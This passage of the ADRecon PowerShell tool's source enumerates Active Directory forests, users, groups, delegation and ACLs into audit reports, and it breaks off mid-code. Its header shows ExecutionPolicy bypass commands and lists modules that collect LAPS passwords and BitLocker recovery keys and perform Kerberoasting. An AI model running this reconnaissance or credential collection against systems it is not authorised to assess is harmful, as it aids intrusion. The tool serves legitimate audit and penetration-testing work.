<#

.SYNOPSIS

    ADRecon is a tool which gathers information about the Active Directory and generates a report which can provide a holistic picture of the current state of the target AD environment.

.DESCRIPTION

    ADRecon is a tool which extracts and combines various artefacts (as highlighted below) out of an AD environment. The information can be presented in a specially formatted Microsoft Excel report that includes summary views with metrics to facilitate analysis and provide a holistic picture of the current state of the target AD environment.
    The tool is useful to various classes of security professionals like auditors, DFIR, students, administrators, etc. It can also be an invaluable post-exploitation tool for a penetration tester.
    It can be run from any workstation that is connected to the environment, even hosts that are not domain members. Furthermore, the tool can be executed in the context of a non-privileged (i.e. standard domain user) account.
    Fine Grained Password Policy, LAPS and BitLocker may require Privileged user accounts.
    The tool will use Microsoft Remote Server Administration Tools (RSAT) if available, otherwise it will communicate with the Domain Controller using LDAP.
    The following information is gathered by the tool:
    - Forest;
    - Domain;
    - Trusts;
    - Sites;
    - Subnets;
    - Default and Fine Grained Password Policy (if implemented);
    - Domain Controllers, SMB versions, whether SMB Signing is supported and FSMO roles;
    - Users and their attributes;
    - Service Principal Names (SPNs);
    - Groups and memberships;
    - Organizational Units (OUs);
    - Group Policy Object and gPLink details;
    - DNS Zones and Records;
    - Printers;
    - Computers and their attributes;
    - PasswordAttributes (Experimental);
    - LAPS passwords (if implemented);
    - BitLocker Recovery Keys (if implemented);
    - ACLs (DACLs and SACLs) for the Domain, OUs, Root Containers, GPO, Users, Computers and Groups objects;
    - GPOReport (requires RSAT);
    - Kerberoast (not included in the default collection method); and
    - Domain accounts used for service accounts (requires privileged account and not included in the default collection method).

    Author     : Prashant Mahajan
    Company    : https://www.senseofsecurity.com.au

.NOTES

    The following commands can be used to turn off ExecutionPolicy: (Requires Admin Privs)

    PS > $ExecPolicy = Get-ExecutionPolicy
    PS > Set-ExecutionPolicy bypass
    PS > .\ADRecon.ps1
    PS > Set-ExecutionPolicy $ExecPolicy

    OR

    Start the PowerShell as follows:
    powershell.exe -ep bypass

    OR

    Already have a PowerShell open ?
    PS > $Env:PSExecutionPolicyPreference = 'Bypass'

    OR

    powershell.exe -nologo -executionpolicy bypass -noprofile -file ADRecon.ps1

.PARAMETER Protocol
	Which protocol to use; ADWS (default) or LDAP

.PARAMETER DomainController
	Domain Controller IP Address or Domain FQDN.

.PARAMETER Credential
	Domain Credentials.

.PARAMETER GenExcel
	Path for ADRecon output folder containing the CSV files to generate the ADRecon-Report.xlsx. Use it to generate the ADRecon-Report.xlsx when Microsoft Excel is not installed on the host used to run ADRecon.

.PARAMETER OutputDir
	Path for ADRecon output folder to save the files and the ADRecon-Report.xlsx. (The folder specified will be created if it doesn't exist)

.PARAMETER Collect
    Which modules to run; Comma separated; e.g Forest,Domain (Default all except Kerberoast, DomainAccountsusedforServiceLogon)
    Valid values include: Forest, Domain, Trusts, Sites, Subnets, PasswordPolicy, FineGrainedPasswordPolicy, DomainControllers, Users, UserSPNs, PasswordAttributes, Groups, GroupMembers, OUs, GPOs, gPLinks, DNSZones, Printers, Computers, ComputerSPNs, LAPS, BitLocker, ACLs, GPOReport, Kerberoast, DomainAccountsusedforServiceLogon.

.PARAMETER OutputType
    Output Type; Comma seperated; e.g STDOUT,CSV,XML,JSON,HTML,Excel (Default STDOUT with -Collect parameter, else CSV and Excel).
    Valid values include: STDOUT, CSV, XML, JSON, HTML, Excel, All (excludes STDOUT).

.PARAMETER DormantTimeSpan
    Timespan for Dormant accounts. (Default 90 days)

.PARAMETER PassMaxAge
    Maximum machine account password age. (Default 30 days)

.PARAMETER PageSize
    The PageSize to set for the LDAP searcher object.

.PARAMETER Threads
    The number of threads to use during processing objects. (Default 10)

.PARAMETER Log
    Create ADRecon Log using Start-Transcript

.EXAMPLE

	.\ADRecon.ps1 -GenExcel C:\ADRecon-Report-<timestamp>
    [*] ADRecon <version> by Prashant Mahajan (@prashant3535) from Sense of Security.
    [*] Generating ADRecon-Report.xlsx
    [+] Excelsheet Saved to: C:\ADRecon-Report-<timestamp>\<domain>-ADRecon-Report.xlsx

.EXAMPLE

	.\ADRecon.ps1 -DomainController <IP or FQDN> -Credential <domain\username>
    [*] ADRecon <version> by Prashant Mahajan (@prashant3535) from Sense of Security.
	[*] Running on <domain>\<hostname> - Member Workstation
    <snip>

    Example output from Domain Member with Alternate Credentials.

.EXAMPLE

	.\ADRecon.ps1 -DomainController <IP or FQDN> -Credential <domain\username> -Collect DomainControllers -OutputType Excel
    [*] ADRecon <version> by Prashant Mahajan (@prashant3535) from Sense of Security.
    [*] Running on WORKGROUP\<hostname> - Standalone Workstation
    [*] Commencing - <timestamp>
    [-] Domain Controllers
    [*] Total Execution Time (mins): <minutes>
    [*] Generating ADRecon-Report.xlsx
    [+] Excelsheet Saved to: C:\ADRecon-Report-<timestamp>\<domain>-ADRecon-Report.xlsx
    [*] Completed.
    [*] Output Directory: C:\ADRecon-Report-<timestamp>

    Example output from from a Non-Member using RSAT to only enumerate Domain Controllers.

.EXAMPLE

    .\ADRecon.ps1 -Protocol ADWS -DomainController <IP or FQDN> -Credential <domain\username>
    [*] ADRecon <version> by Prashant Mahajan (@prashant3535) from Sense of Security.
    [*] Running on WORKGROUP\<hostname> - Standalone Workstation
    [*] Commencing - <timestamp>
    [-] Domain
    [-] Forest
    [-] Trusts
    [-] Sites
    [-] Subnets
    [-] Default Password Policy
    [-] Fine Grained Password Policy - May need a Privileged Account
    [-] Domain Controllers
    [-] Users - May take some time
    [-] User SPNs
    [-] PasswordAttributes - Experimental
    [-] Groups - May take some time
    [-] Group Memberships - May take some time
    [-] OrganizationalUnits (OUs)
    [-] GPOs
    [-] gPLinks - Scope of Management (SOM)
    [-] DNS Zones and Records
    [-] Printers
    [-] Computers - May take some time
    [-] Computer SPNs
    [-] LAPS - Needs Privileged Account
    WARNING: [*] LAPS is not implemented.
    [-] BitLocker Recovery Keys - Needs Privileged Account
    [-] ACLs - May take some time
    WARNING: [*] SACLs - Currently, the module is only supported with LDAP.
    [-] GPOReport - May take some time
    WARNING: [EXCEPTION] Current security context is not associated with an Active Directory domain or forest.
    WARNING: [*] Run the tool using RUNAS.
    WARNING: [*] runas /user:<Domain FQDN>\<Username> /netonly powershell.exe
    [*] Total Execution Time (mins): <minutes>
    [*] Output Directory: C:\ADRecon-Report-<timestamp>
    [*] Generating ADRecon-Report.xlsx
    [+] Excelsheet Saved to: C:\ADRecon-Report-<timestamp>\<domain>-ADRecon-Report.xlsx

    Example output from a Non-Member using RSAT.

.EXAMPLE

    .\ADRecon.ps1 -Protocol LDAP -DomainController <IP or FQDN> -Credential <domain\username>
    [*] ADRecon <version> by Prashant Mahajan (@prashant3535) from Sense of Security.
    [*] Running on WORKGROUP\<hostname> - Standalone Workstation
    [*] LDAP bind Successful
    [*] Commencing - <timestamp>
    [-] Domain
    [-] Forest
    [-] Trusts
    [-] Sites
    [-] Subnets
    [-] Default Password Policy
    [-] Fine Grained Password Policy - May need a Privileged Account
    [-] Domain Controllers
    [-] Users - May take some time
    [-] User SPNs
    [-] PasswordAttributes - Experimental
    [-] Groups - May take some time
    [-] Group Memberships - May take some time
    [-] OrganizationalUnits (OUs)
    [-] GPOs
    [-] gPLinks - Scope of Management (SOM)
    [-] DNS Zones and Records
    [-] Printers
    [-] Computers - May take some time
    [-] Computer SPNs
    [-] LAPS - Needs Privileged Account
    WARNING: [*] LAPS is not implemented.
    [-] BitLocker Recovery Keys - Needs Privileged Account
    [-] ACLs - May take some time
    [-] GPOReport - May take some time
    WARNING: [*] Currently, the module is only supported with ADWS.
    [*] Total Execution Time (mins): <minutes>
    [*] Output Directory: C:\ADRecon-Report-<timestamp>
    [*] Generating ADRecon-Report.xlsx
    [+] Excelsheet Saved to: C:\ADRecon-Report-<timestamp>\<domain>-ADRecon-Report.xlsx

    Example output from a Non-Member using LDAP.

.LINK

    https://github.com/sense-of-security/ADRecon
#>

[CmdletBinding()]
param
(
    [Parameter(Mandatory = $false, HelpMessage = "Which protocol to use; ADWS (default) or LDAP.")]
    [ValidateSet('ADWS', 'LDAP')]
    [string] $Protocol = 'ADWS',

    [Parameter(Mandatory = $false, HelpMessage = "Domain Controller IP Address or Domain FQDN.")]
    [string] $DomainController = '',

    [Parameter(Mandatory = $false, HelpMessage = "Domain Credentials.")]
    [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

    [Parameter(Mandatory = $false, HelpMessage = "Path for ADRecon output folder containing the CSV files to generate the ADRecon-Report.xlsx. Use it to generate the ADRecon-Report.xlsx when Microsoft Excel is not installed on the host used to run ADRecon.")]
    [string] $GenExcel,

    [Parameter(Mandatory = $false, HelpMessage = "Path for ADRecon output folder to save the CSV/XML/JSON/HTML files and the ADRecon-Report.xlsx. (The folder specified will be created if it doesn't exist)")]
    [string] $OutputDir,

    [Parameter(Mandatory = $false, HelpMessage = "Which modules to run; Comma separated; e.g Forest,Domain (Default all except Kerberoast, DomainAccountsusedforServiceLogon) Valid values include: Forest, Domain, Trusts, Sites, Subnets, PasswordPolicy, FineGrainedPasswordPolicy, DomainControllers, Users, UserSPNs, PasswordAttributes, Groups, GroupMembers, OUs, GPOs, gPLinks, DNSZones, Printers, Computers, ComputerSPNs, LAPS, BitLocker, ACLs, GPOReport, Kerberoast, DomainAccountsusedforServiceLogon")]
    [ValidateSet('Forest', 'Domain', 'Trusts', 'Sites', 'Subnets', 'PasswordPolicy', 'FineGrainedPasswordPolicy', 'DomainControllers', 'Users', 'UserSPNs', 'PasswordAttributes', 'Groups', 'GroupMembers', 'OUs', 'GPOs', 'gPLinks', 'DNSZones', 'Printers', 'Computers', 'ComputerSPNs', 'LAPS', 'BitLocker', 'ACLs', 'GPOReport', 'Kerberoast', 'DomainAccountsusedforServiceLogon', 'Default')]
    [array] $Collect = 'Default',

    [Parameter(Mandatory = $false, HelpMessage = "Output type; Comma seperated; e.g STDOUT,CSV,XML,JSON,HTML,Excel (Default STDOUT with -Collect parameter, else CSV and Excel)")]
    [ValidateSet('STDOUT', 'CSV', 'XML', 'JSON', 'EXCEL', 'HTML', 'All', 'Default')]
    [array] $OutputType = 'Default',

    [Parameter(Mandatory = $false, HelpMessage = "Timespan for Dormant accounts. Default 90 days")]
    [ValidateRange(1,1000)]
    [int] $DormantTimeSpan = 90,

    [Parameter(Mandatory = $false, HelpMessage = "Maximum machine account password age. Default 30 days")]
    [ValidateRange(1,1000)]
    [int] $PassMaxAge = 30,

    [Parameter(Mandatory = $false, HelpMessage = "The PageSize to set for the LDAP searcher object. Default 200")]
    [ValidateRange(1,10000)]
    [int] $PageSize = 200,

    [Parameter(Mandatory = $false, HelpMessage = "The number of threads to use during processing of objects. Default 10")]
    [ValidateRange(1,100)]
    [int] $Threads = 10,

    [Parameter(Mandatory = $false, HelpMessage = "Create ADRecon Log using Start-Transcript")]
    [switch] $Log
)

$ADWSSource = @"
// Thanks Dennis Albuquerque for the C# multithreading code
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.DirectoryServices;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Management.Automation;

namespace ADRecon
{
    public static class ADWSClass
    {
        private static DateTime Date1;
        private static int PassMaxAge;
        private static int DormantTimeSpan;
        private static Dictionary<String, String> AdGroupDictionary = new Dictionary<String, String>();
        private static String DomainSID;
        private static Dictionary<String, String> AdGPODictionary = new Dictionary<String, String>();
        private static Hashtable GUIDs = new Hashtable();
        private static Dictionary<String, String> AdSIDDictionary = new Dictionary<String, String>();
        private static readonly HashSet<string> Groups = new HashSet<string> ( new String[] {"268435456", "268435457", "536870912", "536870913"} );
        private static readonly HashSet<string> Users = new HashSet<string> ( new String[] { "805306368" } );
        private static readonly HashSet<string> Computers = new HashSet<string> ( new String[] { "805306369" }) ;
        private static readonly HashSet<string> TrustAccounts = new HashSet<string> ( new String[] { "805306370" } );

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum UACFlags
        {
            SCRIPT = 1,        // 0x1
            ACCOUNTDISABLE = 2,        // 0x2
            HOMEDIR_REQUIRED = 8,        // 0x8
            LOCKOUT = 16,       // 0x10
            PASSWD_NOTREQD = 32,       // 0x20
            PASSWD_CANT_CHANGE = 64,       // 0x40
            ENCRYPTED_TEXT_PASSWORD_ALLOWED = 128,      // 0x80
            TEMP_DUPLICATE_ACCOUNT = 256,      // 0x100
            NORMAL_ACCOUNT = 512,      // 0x200
            INTERDOMAIN_TRUST_ACCOUNT = 2048,     // 0x800
            WORKSTATION_TRUST_ACCOUNT = 4096,     // 0x1000
            SERVER_TRUST_ACCOUNT = 8192,     // 0x2000
            DONT_EXPIRE_PASSWD = 65536,    // 0x10000
            MNS_LOGON_ACCOUNT = 131072,   // 0x20000
            SMARTCARD_REQUIRED = 262144,   // 0x40000
            TRUSTED_FOR_DELEGATION = 524288,   // 0x80000
            NOT_DELEGATED = 1048576,  // 0x100000
            USE_DES_KEY_ONLY = 2097152,  // 0x200000
            DONT_REQUIRE_PREAUTH = 4194304,  // 0x400000
            PASSWORD_EXPIRED = 8388608,  // 0x800000
            TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 16777216, // 0x1000000
            PARTIAL_SECRETS_ACCOUNT = 67108864 // 0x04000000
        }

        [Flags]
        //Values taken from https://blogs.msdn.microsoft.com/openspecification/2011/05/30/windows-configurations-for-kerberos-supported-encryption-type/
        public enum KerbEncFlags
        {
            ZERO = 0,
            DES_CBC_CRC = 1,        // 0x1
            DES_CBC_MD5 = 2,        // 0x2
            RC4_HMAC = 4,        // 0x4
            AES128_CTS_HMAC_SHA1_96 = 8,       // 0x18
            AES256_CTS_HMAC_SHA1_96 = 16       // 0x10
        }

		private static readonly Dictionary<String, String> Replacements = new Dictionary<String, String>()
        {
            //{System.Environment.NewLine, ""},
            //{",", ";"},
            {"\"", "'"}
        };

        public static String CleanString(Object StringtoClean)
        {
            // Remove extra spaces and new lines
            String CleanedString = String.Join(" ", ((Convert.ToString(StringtoClean)).Split((string[]) null, StringSplitOptions.RemoveEmptyEntries)));
            foreach (String Replacement in Replacements.Keys)
            {
                CleanedString = CleanedString.Replace(Replacement, Replacements[Replacement]);
            }
            return CleanedString;
        }

        public static int ObjectCount(Object[] ADRObject)
        {
            return ADRObject.Length;
        }

        public static Object[] UserParser(Object[] AdUsers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            ADWSClass.DormantTimeSpan = DormantTimeSpan;
            ADWSClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "Users");
            return ADRObj;
        }

        public static Object[] UserSPNParser(Object[] AdUsers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "UserSPNs");
            return ADRObj;
        }

        public static Object[] GroupParser(Object[] AdGroups, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "Groups");
            return ADRObj;
        }

        public static Object[] GroupMemberParser(Object[] AdGroups, Object[] AdGroupMembers, String DomainSID, int numOfThreads)
        {
            ADWSClass.AdGroupDictionary = new Dictionary<String, String>();
            runProcessor(AdGroups, numOfThreads, "GroupsDictionary");
            ADWSClass.DomainSID = DomainSID;
            Object[] ADRObj = runProcessor(AdGroupMembers, numOfThreads, "GroupMembers");
            return ADRObj;
        }

        public static Object[] OUParser(Object[] AdOUs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdOUs, numOfThreads, "OUs");
            return ADRObj;
        }

        public static Object[] GPOParser(Object[] AdGPOs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGPOs, numOfThreads, "GPOs");
            return ADRObj;
        }

        public static Object[] SOMParser(Object[] AdGPOs, Object[] AdSOMs, int numOfThreads)
        {
            ADWSClass.AdGPODictionary = new Dictionary<String, String>();
            runProcessor(AdGPOs, numOfThreads, "GPOsDictionary");
            Object[] ADRObj = runProcessor(AdSOMs, numOfThreads, "SOMs");
            return ADRObj;
        }

        public static Object[] PrinterParser(Object[] ADPrinters, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(ADPrinters, numOfThreads, "Printers");
            return ADRObj;
        }

        public static Object[] ComputerParser(Object[] AdComputers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            ADWSClass.DormantTimeSpan = DormantTimeSpan;
            ADWSClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "Computers");
            return ADRObj;
        }

        public static Object[] ComputerSPNParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "ComputerSPNs");
            return ADRObj;
        }

        public static Object[] LAPSParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "LAPS");
            return ADRObj;
        }

        public static Object[] DACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            ADWSClass.AdSIDDictionary = new Dictionary<String, String>();
            runProcessor(ADObjects, numOfThreads, "SIDDictionary");
            ADWSClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "DACLs");
            return ADRObj;
        }

        public static Object[] SACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            ADWSClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "SACLs");
            return ADRObj;
        }

        static Object[] runProcessor(Object[] arrayToProcess, int numOfThreads, string processorType)
        {
            int totalRecords = arrayToProcess.Length;
            IRecordProcessor recordProcessor = recordProcessorFactory(processorType);
            IResultsHandler resultsHandler = new SimpleResultsHandler ();
            int numberOfRecordsPerThread = totalRecords / numOfThreads;
            int remainders = totalRecords % numOfThreads;

            Thread[] threads = new Thread[numOfThreads];
            for (int i = 0; i < numOfThreads; i++)
            {
                int numberOfRecordsToProcess = numberOfRecordsPerThread;
                if (i == (numOfThreads - 1))
                {
                    //last thread, do the remaining records
                    numberOfRecordsToProcess += remainders;
                }

                //split the full array into chunks to be given to different threads
                Object[] sliceToProcess = new Object[numberOfRecordsToProcess];
                Array.Copy(arrayToProcess, i * numberOfRecordsPerThread, sliceToProcess, 0, numberOfRecordsToProcess);
                ProcessorThread processorThread = new ProcessorThread(i, recordProcessor, resultsHandler, sliceToProcess);
                threads[i] = new Thread(processorThread.processThreadRecords);
                threads[i].Start();
            }
            foreach (Thread t in threads)
            {
                t.Join();
            }

            return resultsHandler.finalise();
        }

        static IRecordProcessor recordProcessorFactory(String name)
        {
            switch (name)
            {
                case "Users":
                    return new UserRecordProcessor();
                case "UserSPNs":
                    return new UserSPNRecordProcessor();
                case "Groups":
                    return new GroupRecordProcessor();
                case "GroupsDictionary":
                    return new GroupRecordDictionaryProcessor();
                case "GroupMembers":
                    return new GroupMemberRecordProcessor();
                case "OUs":
                    return new OURecordProcessor();
                case "GPOs":
                    return new GPORecordProcessor();
                case "GPOsDictionary":
                    return new GPORecordDictionaryProcessor();
                case "SOMs":
                    return new SOMRecordProcessor();
                case "Printers":
                    return new PrinterRecordProcessor();
                case "Computers":
                    return new ComputerRecordProcessor();
                case "ComputerSPNs":
                    return new ComputerSPNRecordProcessor();
                case "LAPS":
                    return new LAPSRecordProcessor();
                case "SIDDictionary":
                    return new SIDRecordDictionaryProcessor();
                case "DACLs":
                    return new DACLRecordProcessor();
                case "SACLs":
                    return new SACLRecordProcessor();
            }
            throw new ArgumentException("Invalid processor type " + name);
        }

        class ProcessorThread
        {
            readonly int id;
            readonly IRecordProcessor recordProcessor;
            readonly IResultsHandler resultsHandler;
            readonly Object[] objectsToBeProcessed;

            public ProcessorThread(int id, IRecordProcessor recordProcessor, IResultsHandler resultsHandler, Object[] objectsToBeProcessed)
            {
                this.recordProcessor = recordProcessor;
                this.id = id;
                this.resultsHandler = resultsHandler;
                this.objectsToBeProcessed = objectsToBeProcessed;
            }

            public void processThreadRecords()
            {
                for (int i = 0; i < objectsToBeProcessed.Length; i++)
                {
                    Object[] result = recordProcessor.processRecord(objectsToBeProcessed[i]);
                    resultsHandler.processResults(result); //this is a thread safe operation
                }
            }
        }

        //The interface and implmentation class used to process a record (this implemmentation just returns a log type string)

        interface IRecordProcessor
        {
            PSObject[] processRecord(Object record);
        }

        class UserRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdUser = (PSObject) record;
                    bool? Enabled = null;
                    bool MustChangePasswordatLogon = false;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool NeverLoggedIn = false;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    int? AccountExpirationNumofDays = null;
                    bool Dormant = false;
                    String SIDHistory = "";
                    bool? KerberosRC4 = null;
                    bool? KerberosAES128 = null;
                    bool? KerberosAES256 = null;
                    String DelegationType = null;
                    String DelegationProtocol = null;
                    String DelegationServices = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;
                    DateTime? AccountExpires = null;

                    try
                    {
                        // The Enabled field can be blank which raises an exception. This may occur when the user is not allowed to query the UserAccountControl attribute.
                        Enabled = (bool) AdUser.Members["Enabled"].Value;
                    }
                    catch //(Exception e)
                    {
                        //Console.WriteLine("{0} Exception caught.", e);
                    }
                    if (AdUser.Members["lastLogonTimeStamp"].Value != null)
                    {
                        //LastLogonDate = DateTime.FromFileTime((long)(AdUser.Members["lastLogonTimeStamp"].Value));
                        // LastLogonDate is lastLogonTimeStamp converted to local time
                        LastLogonDate = Convert.ToDateTime(AdUser.Members["LastLogonDate"].Value);
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    else
                    {
                        NeverLoggedIn = true;
                    }
                    if (Convert.ToString(AdUser.Members["pwdLastSet"].Value) == "0")
                    {
                        if ((bool) AdUser.Members["PasswordNeverExpires"].Value == false)
                        {
                            MustChangePasswordatLogon = true;
                        }
                    }
                    if (AdUser.Members["PasswordLastSet"].Value != null)
                    {
                        //PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Members["pwdLastSet"].Value));
                        // PasswordLastSet is pwdLastSet converted to local time
                        PasswordLastSet = Convert.ToDateTime(AdUser.Members["PasswordLastSet"].Value);
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    //https://msdn.microsoft.com/en-us/library/ms675098(v=vs.85).aspx
                    //if ((Int64) AdUser.Members["accountExpires"].Value != (Int64) 9223372036854775807)
                    //{
                        //if ((Int64) AdUser.Members["accountExpires"].Value != (Int64) 0)
                        if (AdUser.Members["AccountExpirationDate"].Value != null)
                        {
                            try
                            {
                                //AccountExpires = DateTime.FromFileTime((long)(AdUser.Members["accountExpires"].Value));
                                // AccountExpirationDate is accountExpires converted to local time
                                AccountExpires = Convert.ToDateTime(AdUser.Members["AccountExpirationDate"].Value);
                                AccountExpirationNumofDays = ((int)((DateTime)AccountExpires - Date1).Days);

                            }
                            catch //(Exception e)
                            {
                                //Console.WriteLine("{0} Exception caught.", e);
                            }
                        }
                    //}
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdUser.Members["SIDHistory"].Value;
                    if (history.Value is System.Security.Principal.SecurityIdentifier[])
                    {
                        string sids = "";
                        foreach (var value in (SecurityIdentifier[]) history.Value)
                        {
                            sids = sids + "," + Convert.ToString(value);
                        }
                        SIDHistory = sids.TrimStart(',');
                    }
                    else
                    {
                        SIDHistory = history != null ? Convert.ToString(history.Value) : "";
                    }
                    if (AdUser.Members["msDS-SupportedEncryptionTypes"].Value != null)
                    {
                        var userKerbEncFlags = (KerbEncFlags) AdUser.Members["msDS-SupportedEncryptionTypes"].Value;
                        if (userKerbEncFlags != KerbEncFlags.ZERO)
                        {
                            KerberosRC4 = (userKerbEncFlags & KerbEncFlags.RC4_HMAC) == KerbEncFlags.RC4_HMAC;
                            KerberosAES128 = (userKerbEncFlags & KerbEncFlags.AES128_CTS_HMAC_SHA1_96) == KerbEncFlags.AES128_CTS_HMAC_SHA1_96;
                            KerberosAES256 = (userKerbEncFlags & KerbEncFlags.AES256_CTS_HMAC_SHA1_96) == KerbEncFlags.AES256_CTS_HMAC_SHA1_96;
                        }
                    }
                    if ((bool) AdUser.Members["TrustedForDelegation"].Value)
                    {
                        DelegationType = "Unconstrained";
                        DelegationServices = "Any";
                    }
                    if (AdUser.Members["msDS-AllowedToDelegateTo"] != null)
                    {
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection delegateto = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdUser.Members["msDS-AllowedToDelegateTo"].Value;
                        if (delegateto.Value != null)
                        {
                            DelegationType = "Constrained";
                            if (delegateto.Value is System.String[])
                            {
                                foreach (var value in (String[]) delegateto.Value)
                                {
                                    DelegationServices = DelegationServices + "," + Convert.ToString(value);
                                }
                                DelegationServices = DelegationServices.TrimStart(',');
                            }
                            else
                            {
                                DelegationServices = Convert.ToString(delegateto.Value);
                            }
                        }
                    }
                    if ((bool) AdUser.Members["TrustedToAuthForDelegation"].Value == true)
                    {
                        DelegationProtocol = "Any";
                    }
                    else if (DelegationType != null)
                    {
                        DelegationProtocol = "Kerberos";
                    }

                    PSObject UserObj = new PSObject();
                    UserObj.Members.Add(new PSNoteProperty("UserName", AdUser.Members["SamAccountName"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Name", CleanString(AdUser.Members["Name"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                    UserObj.Members.Add(new PSNoteProperty("Must Change Password at Logon", MustChangePasswordatLogon));
                    UserObj.Members.Add(new PSNoteProperty("Cannot Change Password", AdUser.Members["CannotChangePassword"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Password Never Expires", AdUser.Members["PasswordNeverExpires"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Reversible Password Encryption", AdUser.Members["AllowReversiblePasswordEncryption"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Smartcard Logon Required", AdUser.Members["SmartcardLogonRequired"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Permitted", !((bool) AdUser.Members["AccountNotDelegated"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos DES Only", AdUser.Members["UseDESKeyOnly"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos RC4", KerberosRC4));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-128bit", KerberosAES128));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-256bit", KerberosAES256));
                    UserObj.Members.Add(new PSNoteProperty("Does Not Require Pre Auth", AdUser.Members["DoesNotRequirePreAuth"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Never Logged in", NeverLoggedIn));
                    UserObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    UserObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    UserObj.Members.Add(new PSNoteProperty("Account Locked Out", AdUser.Members["LockedOut"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Password Expired", AdUser.Members["PasswordExpired"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Password Not Required", AdUser.Members["PasswordNotRequired"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    UserObj.Members.Add(new PSNoteProperty("Logon Workstations", AdUser.Members["LogonWorkstations"].Value));
                    UserObj.Members.Add(new PSNoteProperty("AdminCount", AdUser.Members["AdminCount"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Primary GroupID", AdUser.Members["primaryGroupID"].Value));
                    UserObj.Members.Add(new PSNoteProperty("SID", AdUser.Members["SID"].Value));
                    UserObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    UserObj.Members.Add(new PSNoteProperty("Description", CleanString(AdUser.Members["Description"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Title", CleanString(AdUser.Members["Title"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Department", CleanString(AdUser.Members["Department"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Company", CleanString(AdUser.Members["Company"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Manager", CleanString(AdUser.Members["Manager"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Info", CleanString(AdUser.Members["Info"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    UserObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration Date", AccountExpires));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration (days)", AccountExpirationNumofDays));
                    UserObj.Members.Add(new PSNoteProperty("Mobile", CleanString(AdUser.Members["Mobile"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Email", CleanString(AdUser.Members["mail"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("HomeDirectory", AdUser.Members["homeDirectory"].Value));
                    UserObj.Members.Add(new PSNoteProperty("ProfilePath", AdUser.Members["profilePath"].Value));
